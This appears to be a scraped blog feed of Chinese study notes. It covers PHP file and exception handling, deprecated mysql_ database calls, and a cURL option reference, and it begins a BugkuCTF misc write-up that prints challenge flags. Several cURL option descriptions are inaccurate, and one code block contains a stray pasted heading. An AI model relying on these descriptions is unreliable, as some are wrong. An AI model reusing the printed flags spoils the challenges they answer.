<p><code>file_exists</code> 函数,不仅可以判断文件是否存在，同时也可以判断目录是否存在<br><code>is_file</code> 函数，能确切的判断给定的路径是否是一个文件</p>
<p><code>is_readable</code>函数与<code>is_writeable</code>函数能在文件是否存在的基础上，判断文件是否可读与可写</p>
<h3 id="取得文件的修改时间"><a href="#取得文件的修改时间" class="headerlink" title="取得文件的修改时间"></a>取得文件的修改时间</h3><p>fileowner：获得文件的所有者<br>filectime：获取文件的创建时间<br>filemtime：获取文件的修改时间<br>fileatime：获取文件的访问时间</p>
<h3 id="取得文件的大小"><a href="#取得文件的大小" class="headerlink" title="取得文件的大小"></a>取得文件的大小</h3><p><code>filesize</code>函数</p>
<h3 id="写入内容到文件"><a href="#写入内容到文件" class="headerlink" title="写入内容到文件"></a>写入内容到文件</h3><p><code>file_put_contents</code>函数  可以把一个字符串写入文件中，如果文件不存在将创建新文件<br><strong>mode：</strong><br><code>FILE_USE_INCLUDE_PATH</code>  检查 <code>*filename*</code> 副本的内置路径<br><code>FILE_APPEND</code>  向文件末尾追加内容<br><code>LOCK_EX</code>  防止多人同时写入</p>
<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p><code>unlink</code>函数，删除文件<br><code>rmdir</code>函数，删除空文件夹</p>
<p>循环删除使用<code>glob</code>函数遍历所有文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (glob(<span class="string">"*"</span>) <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">   unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h3><p><strong>抛出异常，可以保障程序的正确性与安全，避免导致不可预知的bug</strong></p>
<ol>
<li>基本语法</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//可能出现错误或异常的代码</span></span><br><span class="line"><span class="comment">//catch表示捕获，Exception是php已定义好的异常类</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="comment">//对异常处理，方法：</span></span><br><span class="line"><span class="comment">//1、自己处理</span></span><br><span class="line"><span class="comment">//2、不处理，将其再次抛出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>处理处理程序应当包括：</li>
</ol>
<p><strong>Try</strong> - 使用异常的函数应该位于 “try”  代码块内。如果没有触发异常，则代码将照常继续执行。但是如果异常被触发，会抛出一个异常。</p>
<p><strong>Throw</strong> - 这里规定如何触发异常。注意：每一个 “throw” 必须对应至少一个 “catch”，当然可以对应多个”catch”</p>
<p><strong>Catch</strong> - “catch” 代码块会捕获异常，并创建一个包含异常信息的对象。</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建可抛出一个异常的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNum</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>($number&gt;<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"异常提示-数字必须小于等于1"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//在 "try" 代码块中触发异常</span></span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">     checkNum(<span class="number">2</span>);</span><br><span class="line">     <span class="comment">//如果异常被抛出，那么下面一行代码将不会被输出</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'如果能看到这个提示，说明你的数字小于等于1'</span>;</span><br><span class="line"> &#125;<span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">     <span class="comment">//捕获异常</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">'捕获异常: '</span> .$e-&gt;getMessage();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="异常处理类"><a href="#异常处理类" class="headerlink" title="异常处理类"></a>异常处理类</h3><p><code>Exception</code>是所有异常处理的基类</p>
<p>基本属性：<br>message 异常消息内容<br>code 异常代码<br>file 抛出异常的文件名<br>line 抛出异常在该文件的行数</p>
<p>方法：<br>getTrace 获取异常追踪信息<br>getTraceAsString 获取异常追踪信息的字符串<br>getMessage 获取出错信息</p>
<h3 id="捕获异常信息"><a href="#捕获异常信息" class="headerlink" title="捕获异常信息"></a>捕获异常信息</h3><p><code>try{}catch(Exception $){}</code></p>
<h3 id="获取错误发生的所在行"><a href="#获取错误发生的所在行" class="headerlink" title="获取错误发生的所在行"></a>获取错误发生的所在行</h3><p>将错误信息写入错误日志中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'wrong'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $ex) &#123;</span><br><span class="line">    $msg = <span class="string">'Error:'</span>.$ex-&gt;getMessage().<span class="string">"\n"</span>;</span><br><span class="line">    $msg.= $ex-&gt;getTraceAsString().<span class="string">"\n"</span>;</span><br><span class="line">    $msg.= <span class="string">'异常行号：'</span>.$ex-&gt;getLine().<span class="string">"\n"</span>;</span><br><span class="line">    $msg.= <span class="string">'所在文件：'</span>.$ex-&gt;getFile().<span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment">//将异常信息记录到日志中</span></span><br><span class="line"> PHP异常处理之   file_put_contents(<span class="string">'error.log'</span>, $msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="PHP数据库扩展"><a href="#PHP数据库扩展" class="headerlink" title="PHP数据库扩展"></a>PHP数据库扩展</h2><h3 id="进行数据库连接的方法"><a href="#进行数据库连接的方法" class="headerlink" title="进行数据库连接的方法"></a>进行数据库连接的方法</h3><ul>
<li>mysql扩展：</li>
</ul>
<p><code>$link = mysql_connect(&#39;mysql_host&#39;, &#39;mysql_user&#39;, &#39;mysql_password&#39;);</code></p>
<ul>
<li>mysqli扩展：</li>
</ul>
<p><code>$link = mysqli_connect(&#39;mysql_host&#39;, &#39;mysql_user&#39;, &#39;mysql_password&#39;);</code></p>
<ul>
<li>PDO扩展</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dsn = &apos;mysql:dbname=testdb;host=127.0.0.1&apos;;</span><br><span class="line">$user = &apos;dbuser&apos;;</span><br><span class="line">$password = &apos;dbpass&apos;;</span><br><span class="line">$dbh = new PDO($dsn, $user, $password);</span><br></pre></td></tr></table></figure>
<h3 id="执行MySQL查询"><a href="#执行MySQL查询" class="headerlink" title="执行MySQL查询"></a>执行MySQL查询</h3><p><code>mysql_query</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">'127.0.0.1'</span>, <span class="string">'code1'</span>, <span class="string">''</span>);</span><br><span class="line">mysql_select_db(<span class="string">'code1'</span>);</span><br><span class="line">mysql_query(<span class="string">"set names 'utf8'"</span>);</span><br><span class="line"></span><br><span class="line">$link1 = mysql_connect(<span class="string">'127.0.0.1'</span>, <span class="string">'code1'</span>, <span class="string">''</span>);</span><br><span class="line">$link2 = mysql_connect(<span class="string">'127.0.0.1'</span>, <span class="string">'code1'</span>, <span class="string">''</span>, <span class="keyword">true</span>); <span class="comment">//开启一个新的连接</span></span><br><span class="line">$res = mysql_query(<span class="string">'select * from user limit 1'</span>, $link1); <span class="comment">//从第一个连接中查询数据</span></span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_array($res);</span><br><span class="line">var_dump($row);</span><br></pre></td></tr></table></figure>
<hr>
<p>####　往后的涉及sql的语法另开笔记记录</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cURL参数说明]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws8x0046d0ucalj94etw/</url>
      <content type="html"><![CDATA[<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>curl_setopt() 调用设置<br>语法: curl_setopt (int ch, string option, mixed value) </p>
<a id="more"></a>
<h5 id="第一类：value应该被设置一个bool类型（TRUE-FLASE-1，0）的值"><a href="#第一类：value应该被设置一个bool类型（TRUE-FLASE-1，0）的值" class="headerlink" title="第一类：value应该被设置一个bool类型（TRUE,FLASE,1，0）的值"></a>第一类：value应该被设置一个bool类型（TRUE,FLASE,1，0）的值</h5><p>CURLOPT_AUTOREFERER<br>当根据Location:重定向时，自动设置header中的Referer:信息。</p>
<p>CURLOPT_BINARYTRANSFER<br>在启用CURLOPT_RETURNTRANSFER的时候，返回原生的（Raw）输出。</p>
<p>CURLOPT_COOKIESESSION<br>启用时curl会仅仅传递一个session cookie，忽略其他的cookie，默认状况下cURL会将所有的cookie返回给服务端。session cookie是指那些用来判断服务器端的session是否有效而存在的cookie。</p>
<p>CURLOPT_CRLF<br>启用时将Unix的换行符转换成回车换行符。</p>
<p>CURLOPT_DNS_USE_GLOBAL_CACHE<br>启用时会启用一个全局的DNS缓存，此项为线程安全的，并且默认启用。</p>
<p>CURLOPT_FAILONERROR<br>显示HTTP状态码，默认行为是忽略编号小于等于400的HTTP信息。</p>
<p>CURLOPT_FILETIME<br>启用时会尝试修改远程文档中的信息。结果信息会通过 curl_getinfo()函数的CURLINFO_FILETIME选项返回。curl_getinfo().</p>
<p>CURLOPT_FOLLOWLOCATION<br>启用时会将服务器服务器返回的”Location: “放在header中递归的返回给服务器，使用CURLOPT_MAXREDIRS可以限定递归返回的数量，启用这个参数，可以获取到跳转后的最终地址。</p>
<p>CURLOPT_FORBID_REUSE<br>在完成交互以后强迫断开连接，不能重用。</p>
<p>CURLOPT_FRESH_CONNECT<br>强制获取一个新的连接，替代缓存中的连接。</p>
<p>CURLOPT_FTP_USE_EPRT<br>启用时当FTP下载时，使用EPRT (或 LPRT)命令。设置为FALSE时禁用EPRT和LPRT，使用PORT命令 only.</p>
<p>CURLOPT_FTP_USE_EPSV<br>启用时，在FTP传输过程中回复到PASV模式前首先尝试EPSV命令。设置为FALSE时禁用EPSV命令。</p>
<p>CURLOPT_FTPAPPEND<br>启用时追加写入文件而不是覆盖它。</p>
<p>CURLOPT_FTPASCII<br>CURLOPT_TRANSFERTEXT的别名。</p>
<p>CURLOPT_FTPLISTONLY<br>启用时只列出FTP目录的名字。</p>
<p>CURLOPT_HEADER<br>启用时会将头文件的信息作为数据流输出。</p>
<p>CURLINFO_HEADER_OUT<br>启用时追踪句柄的请求字符串。<br>从 PHP 5.1.3 开始可用。CURLINFO_前缀是故意的(intentional)。</p>
<p>CURLOPT_HTTPGET<br>启用时会设置HTTP的method为GET，因为GET是默认是，所以只在被修改的情况下使用。</p>
<p>CURLOPT_HTTPPROXYTUNNEL<br>启用时会通过HTTP代理来传输。</p>
<p>CURLOPT_MUTE<br>启用时将cURL函数中所有修改过的参数恢复默认值。</p>
<p>CURLOPT_NETRC<br>在连接建立以后，访问~/.netrc文件获取用户名和密码信息连接远程站点。</p>
<p>CURLOPT_NOBODY<br>启用时将不对HTML中的BODY部分进行输出，只获取文件状态头。</p>
<p>CURLOPT_NOPROGRESS<br>启用时关闭curl传输的进度条，此项的默认设置为启用。<br>Note:<br>PHP自动地设置这个选项为TRUE，这个选项仅仅应当在以调试为目的时被改变。</p>
<p>CURLOPT_NOSIGNAL<br>启用时忽略所有的curl传递给php进行的信号。在SAPI多线程传输时此项被默认启用。<br>cURL 7.10时被加入。</p>
<p>CURLOPT_POST<br>启用时会发送一个常规的POST请求，类型为：application/x-www-form-urlencoded，就像表单提交的一样。<br>CURLOPT_PUT<br>启用时允许HTTP发送文件，必须同时设置CURLOPT_INFILE和CURLOPT_INFILESIZE。</p>
<p>CURLOPT_RETURNTRANSFER<br>将 curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</p>
<p>CURLOPT_SSL_VERIFYPEER<br>禁用后cURL将终止从服务端进行验证。使用CURLOPT_CAINFO选项设置证书使用CURLOPT_CAPATH选项设置证书目录 如果CURLOPT_SSL_VERIFYPEER(默认值为2)被启用，CURLOPT_SSL_VERIFYHOST需要被设置成TRUE否则设置为FALSE。<br>自cURL 7.10开始默认为TRUE。从cURL 7.10开始默认绑定安装。</p>
<p>CURLOPT_TRANSFERTEXT<br>启用后对FTP传输使用ASCII模式。对于LDAP，它检索纯文本信息而非HTML。在Windows系统上，系统不会把STDOUT设置成binary模式。<br>CURLOPT_UNRESTRICTED_AUTH<br>在使用CURLOPT_FOLLOWLOCATION产生的header中的多个locations中持续追加用户名和密码信息，即使域名已发生改变。<br>CURLOPT_UPLOAD<br>启用后允许文件上传。<br>CURLOPT_VERBOSE<br>启用时会汇报所有的信息，存放在STDERR或指定的CURLOPT_STDERR中。</p>
<h5 id="第二类：value应该被设置一个integer类型（整数，整形，一个数值）的值"><a href="#第二类：value应该被设置一个integer类型（整数，整形，一个数值）的值" class="headerlink" title="第二类：value应该被设置一个integer类型（整数，整形，一个数值）的值"></a>第二类：value应该被设置一个integer类型（整数，整形，一个数值）的值</h5><p>CURLOPT_BUFFERSIZE<br>每次获取的数据中读入缓存的大小，但是不保证这个值每次都会被填满。<br>在cURL 7.10中被加入。</p>
<p>CURLOPT_CLOSEPOLICY<br>不是CURLCLOSEPOLICY_LEAST_RECENTLY_USED就是CURLCLOSEPOLICY_OLDEST，还存在另外三个CURLCLOSEPOLICY_，但是cURL暂时还不支持。<br>CURLOPT_CONNECTTIMEOUT<br>在发起连接前等待的时间，如果设置为0，则无限等待。<br>CURLOPT_CONNECTTIMEOUT_MS<br>尝试连接等待的时间，以毫秒为单位。如果设置为0，则无限等待。<br>在cURL 7.16.2中被加入。从PHP 5.2.3开始可用。</p>
<p>CURLOPT_DNS_CACHE_TIMEOUT<br>设置在内存中保存DNS信息的时间，默认为120秒。<br>CURLOPT_FTPSSLAUTH<br>FTP验证方式：CURLFTPAUTH_SSL (首先尝试SSL)，CURLFTPAUTH_TLS (首先尝试TLS)或CURLFTPAUTH_DEFAULT (让cURL自动决定)。<br>在cURL 7.12.2中被加入。</p>
<p>CURLOPT_HTTP_VERSION<br>CURL_HTTP_VERSION_NONE (默认值，让cURL自己判断使用哪个版本)，CURL_HTTP_VERSION_1_0 (强制使用 HTTP/1.0)或CURL_HTTP_VERSION_1_1 (强制使用 HTTP/1.1)。<br>CURLOPT_HTTPAUTH<br>使用的HTTP验证方法，可选的值有：CURLAUTH_BASIC、CURLAUTH_DIGEST、CURLAUTH_GSSNEGOTIATE、CURLAUTH_NTLM、CURLAUTH_ANY和CURLAUTH_ANYSAFE。<br>可以使用|位域(或)操作符分隔多个值，cURL让服务器选择一个支持最好的值。<br>CURLAUTH_ANY等价于CURLAUTH_BASIC | CURLAUTH_DIGEST | CURLAUTH_GSSNEGOTIATE | CURLAUTH_NTLM.<br>CURLAUTH_ANYSAFE等价于CURLAUTH_DIGEST | CURLAUTH_GSSNEGOTIATE | CURLAUTH_NTLM.<br>CURLOPT_INFILESIZE<br>设定上传文件的大小限制，字节(byte)为单位。<br>CURLOPT_LOW_SPEED_LIMIT<br>当传输速度小于CURLOPT_LOW_SPEED_LIMIT时(bytes/sec)，PHP会根据CURLOPT_LOW_SPEED_TIME来判断是否因太慢而取消传输。<br>CURLOPT_LOW_SPEED_TIME<br>当传输速度小于CURLOPT_LOW_SPEED_LIMIT时(bytes/sec)，PHP会根据CURLOPT_LOW_SPEED_TIME来判断是否因太慢而取消传输。<br>CURLOPT_MAXCONNECTS<br>允许的最大连接数量，超过是会通过CURLOPT_CLOSEPOLICY决定应该停止哪些连接。<br>CURLOPT_MAXREDIRS<br>指定最多的HTTP重定向的数量，这个选项是和CURLOPT_FOLLOWLOCATION一起使用的。<br>CURLOPT_PORT<br>用来指定连接端口。（可选项）<br>CURLOPT_PROTOCOLS<br>CURLPROTO_*的位域指。如果被启用，位域值会限定libcurl在传输过程中有哪些可使用的协议。这将允许你在编译libcurl时支持众多协议，但是限制只是用它们中被允许使用的一个子集。默认libcurl将会使用全部它支持的协议。参见CURLOPT_REDIR_PROTOCOLS.<br>可用的协议选项为：CURLPROTO_HTTP、CURLPROTO_HTTPS、CURLPROTO_FTP、CURLPROTO_FTPS、CURLPROTO_SCP、CURLPROTO_SFTP、CURLPROTO_TELNET、CURLPROTO_LDAP、CURLPROTO_LDAPS、CURLPROTO_DICT、CURLPROTO_FILE、CURLPROTO_TFTP、CURLPROTO_ALL<br>在cURL 7.19.4中被加入。</p>
<p>CURLOPT_PROXYAUTH<br>HTTP代理连接的验证方式。使用在CURLOPT_HTTPAUTH中的位域标志来设置相应选项。对于代理验证只有CURLAUTH_BASIC和CURLAUTH_NTLM当前被支持。<br>在cURL 7.10.7中被加入。</p>
<p>CURLOPT_PROXYPORT</p>
<p>代理服务器的端口。端口也可以在CURLOPT_PROXY中进行设置。</p>
<p>CURLOPT_PROXYTYPE<br>不是CURLPROXY_HTTP (默认值) 就是CURLPROXY_SOCKS5。<br>在cURL 7.10中被加入。</p>
<p>CURLOPT_REDIR_PROTOCOLS<br>CURLPROTO_*中的位域值。如果被启用，位域值将会限制传输线程在CURLOPT_FOLLOWLOCATION开启时跟随某个重定向时可使用的协议。这将使你对重定向时限制传输线程使用被允许的协议子集默认libcurl将会允许除FILE和SCP之外的全部协议。这个和7.19.4预发布版本种无条件地跟随所有支持的协议有一些不同。关于协议常量，请参照CURLOPT_PROTOCOLS。<br>在cURL 7.19.4中被加入。</p>
<p>CURLOPT_RESUME_FROM<br>在恢复传输时传递一个字节偏移量（用来断点续传）。<br>CURLOPT_SSL_VERIFYHOST<br>1 检查服务器SSL证书中是否存在一个公用名(common name)。译者注：公用名(Common Name)一般来讲就是填写你将要申请SSL证书的域名 (domain)或子域名(sub domain)。2 检查公用名是否存在，并且是否与提供的主机名匹配。<br>CURLOPT_SSLVERSION<br>使用的SSL版本(2 或 3)。默认情况下PHP会自己检测这个值，尽管有些情况下需要手动地进行设置。<br>CURLOPT_TIMECONDITION<br>如果在CURLOPT_TIMEVALUE指定的某个时间以后被编辑过，则使用CURL_TIMECOND_IFMODSINCE返回页面，如果没有被修改过，并且CURLOPT_HEADER为true，则返回一个”304 Not Modified”的header，        CURLOPT_HEADER为false，则使用CURL_TIMECOND_IFUNMODSINCE，默认值为CURL_TIMECOND_IFUNMODSINCE。<br>CURLOPT_TIMEOUT<br>设置cURL允许执行的最长秒数。<br>CURLOPT_TIMEOUT_MS<br>设置cURL允许执行的最长毫秒数。<br>在cURL 7.16.2中被加入。从PHP 5.2.3起可使用。</p>
<p>CURLOPT_TIMEVALUE<br>设置一个CURLOPT_TIMECONDITION使用的时间戳，在默认状态下使用的是CURL_TIMECOND_IFMODSINCE。</p>
<h5 id="第三类：value应该被设置一个string类型（引用类型，一串字符串）的值"><a href="#第三类：value应该被设置一个string类型（引用类型，一串字符串）的值" class="headerlink" title="第三类：value应该被设置一个string类型（引用类型，一串字符串）的值"></a>第三类：value应该被设置一个string类型（引用类型，一串字符串）的值</h5><p>CURLOPT_CAINFO<br>一个保存着1个或多个用来让服务端验证的证书的文件名。这个参数仅仅在和CURLOPT_SSL_VERIFYPEER一起使用时才有意义。 .<br>CURLOPT_CAPATH<br>一个保存着多个CA证书的目录。这个选项是和CURLOPT_SSL_VERIFYPEER一起使用的。<br>CURLOPT_COOKIE<br>设定HTTP请求中”Cookie: “部分的内容。多个cookie用分号分隔，分号后带一个空格(例如， “fruit=apple; colour=red”)。<br>CURLOPT_COOKIEFILE<br>包含cookie数据的文件名，cookie文件的格式可以是Netscape格式，或者只是纯HTTP头部信息存入文件。<br>CURLOPT_COOKIEJAR<br>连接结束后保存cookie信息的文件。<br>CURLOPT_CUSTOMREQUEST<br>使用一个自定义的请求信息来代替”GET”或”HEAD”作为HTTP请求。这对于执行”DELETE” 或者其他更隐蔽的HTTP请求。有效值如”GET”，”POST”，”CONNECT”等等。也就是说，不要在这里输入整个HTTP请求。例如输入”GET /index.html HTTP/1.0\r\n\r\n”是不正确的。<br>Note:<br>在确定服务器支持这个自定义请求的方法前不要使用。</p>
<p>CURLOPT_EGDSOCKET<br>类似CURLOPT_RANDOM_FILE，除了一个Entropy Gathering Daemon套接字。<br>CURLOPT_ENCODING<br>HTTP请求头中”Accept-Encoding: “的值。支持的编码有”identity”，”deflate”和”gzip”。如果为空字符串””，请求头会发送所有支持的编码类型。<br>在cURL 7.10中被加入。</p>
<p>CURLOPT_FTPPORT<br>这个值将被用来获取供FTP”POST”指令所需要的IP地址。”POST”指令告诉远程服务器连接到我们指定的IP地址。这个字符串可以是纯文本的IP地址、主机名、一个网络接口名（UNIX下）或者只是一个’-‘来使用默认的IP地址。<br>CURLOPT_INTERFACE<br>网络发送接口名，可以是一个接口名、IP地址或者是一个主机名。<br>CURLOPT_KRB4LEVEL<br>KRB4 (Kerberos 4) 安全级别。下面的任何值都是有效的(从低到高的顺序)：”clear”、”safe”、”confidential”、”private”.。如果字符串和这些都不匹配，将使用”private”。这个选项设置为NULL时将禁用KRB4 安全认证。目前KRB4 安全认证只能用于FTP传输。</p>
<p>CURLOPT_POSTFIELDS<br>全部数据使用HTTP协议中的”POST”操作来发送。要发送文件，在文件名前面加上@前缀并使用完整路径。这个参数可以通过urlencoded后的字符串类似’para1=val1&para;2=val2&amp;…’或使用一个以字段名为键值，字段数据为值的数组。如果value是一个数组，Content-Type头将会被设置成multipart/form-data。<br>CURLOPT_PROXY<br>HTTP代理通道。<br>CURLOPT_PROXYUSERPWD<br>一个用来连接到代理的”[username]:[password]”格式的字符串。<br>CURLOPT_RANDOM_FILE<br>一个被用来生成SSL随机数种子的文件名。<br>CURLOPT_RANGE<br>以”X-Y”的形式，其中X和Y都是可选项获取数据的范围，以字节计。HTTP传输线程也支持几个这样的重复项中间用逗号分隔如”X-Y,N-M”。<br>CURLOPT_REFERER<br>在HTTP请求头中”Referer: “的内容。<br>CURLOPT_SSL_CIPHER_LIST<br>一个SSL的加密算法列表。例如RC4-SHA和TLSv1都是可用的加密列表。<br>CURLOPT_SSLCERT<br>一个包含PEM格式证书的文件名。<br>CURLOPT_SSLCERTPASSWD<br>使用CURLOPT_SSLCERT证书需要的密码。<br>CURLOPT_SSLCERTTYPE<br>证书的类型。支持的格式有”PEM” (默认值), “DER”和”ENG”。<br>在cURL 7.9.3中被加入。</p>
<p>CURLOPT_SSLENGINE<br>用来在CURLOPT_SSLKEY中指定的SSL私钥的加密引擎变量。<br>CURLOPT_SSLENGINE_DEFAULT<br>用来做非对称加密操作的变量。<br>CURLOPT_SSLKEY<br>包含SSL私钥的文件名。<br>CURLOPT_SSLKEYPASSWD<br>在CURLOPT_SSLKEY中指定了的SSL私钥的密码。<br>Note:<br>由于这个选项包含了敏感的密码信息，记得保证这个PHP脚本的安全。</p>
<p>CURLOPT_SSLKEYTYPE<br>CURLOPT_SSLKEY中规定的私钥的加密类型，支持的密钥类型为”PEM”(默认值)、”DER”和”ENG”。<br>CURLOPT_URL<br>需要获取的URL地址，也可以在 curl_init()函数中设置。<br>CURLOPT_USERAGENT<br>在HTTP请求中包含一个”User-Agent: “头的字符串。<br>CURLOPT_USERPWD<br>传递一个连接中需要的用户名和密码，格式为：”[username]:[password]”。</p>
<h5 id="第四类：value应该被设置一个数组"><a href="#第四类：value应该被设置一个数组" class="headerlink" title="第四类：value应该被设置一个数组"></a>第四类：value应该被设置一个数组</h5><p>CURLOPT_HTTP200ALIASES<br>200响应码数组，数组中的响应吗被认为是正确的响应，否则被认为是错误的。<br>在cURL 7.10.3中被加入。</p>
<p>CURLOPT_HTTPHEADER<br>一个用来设置HTTP头字段的数组。使用如下的形式的数组进行设置： array(‘Content-type: text/plain’, ‘Content-length: 100’)<br>CURLOPT_POSTQUOTE<br>在FTP请求执行完成后，在服务器上执行的一组FTP命令。<br>CURLOPT_QUOTE<br>一组先于FTP请求的在服务器上执行的FTP命令。</p>
<p>对于下面的这些option的可选参数，value应该被设置一个流资源 （例如使用 fopen()）：<br>选项<br>可选value值</p>
<p>CURLOPT_FILE<br>设置输出文件的位置，值是一个资源类型，默认为STDOUT (浏览器)。</p>
<p>CURLOPT_INFILE<br>在上传文件的时候需要读取的文件地址，值是一个资源类型。</p>
<p>CURLOPT_STDERR<br>设置一个错误输出地址，值是一个资源类型，取代默认的STDERR。</p>
<p>CURLOPT_WRITEHEADER<br>设置header部分内容的写入的文件地址，值是一个资源类型。</p>
<p>对于下面的这些option的可选参数，value应该被设置为一个回调函数名：<br>选项<br>可选value值</p>
<p>CURLOPT_HEADERFUNCTION<br>设置一个回调函数，这个函数有两个参数，第一个是cURL的资源句柄，第二个是输出的header数据。header数据的输出必须依赖这个函数，返回已写入的数据大小。</p>
<p>CURLOPT_PASSWDFUNCTION<br>设置一个回调函数，有三个参数，第一个是cURL的资源句柄，第二个是一个密码提示符，第三个参数是密码长度允许的最大值。返回密码的值。</p>
<p>CURLOPT_PROGRESSFUNCTION<br>设置一个回调函数，有三个参数，第一个是cURL的资源句柄，第二个是一个文件描述符资源，第三个是长度。返回包含的数据。</p>
<p>CURLOPT_READFUNCTION<br>拥有两个参数的回调函数，第一个是参数是会话句柄，第二是HTTP响应头信息的字符串。使用此函数，将自行处理返回的数据。返回值为数据大小，以字节计。返回0代表EOF信号。</p>
<p>CURLOPT_WRITEFUNCTION<br>拥有两个参数的回调函数，第一个是参数是会话句柄，第二是HTTP响应头信息的字符串。使用此回调函数，将自行处理响应头信息。响应头信息是整个字符串。设置返回值为精确的已写入字符串长度。发生错误时传输线程终止。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> curl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BugkuCTF misc wp]]></title>
      <url>/ctf-writeup-misc/ckwd5ws7m0023d0ucg28jo06d/</url>
      <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>扫描二维码关注得到flag</p>
<a id="more"></a>
<h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad，在末尾发现密文<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>unicode解码得  key{you are right}</p>
<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>拖进winhex，发现高度不对<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>修改成11（往大的改），保存图片，打开得到flag<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>BUGKU{a1e5aSA}</p>
<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>是个数据包，拖进wireshark里打开，看数据包得到flag<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{d316759c281bf925d600be698a4973d5}</p>
<h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>得到一个没有后缀的文件，改后缀名为zip，解压得到docx文件,拖进notepad里看有隐藏文件<br>继续改后缀rar，解压，得到一堆文件,在其中找到<br><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{F1@g}</p>
<h2 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h2><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure>
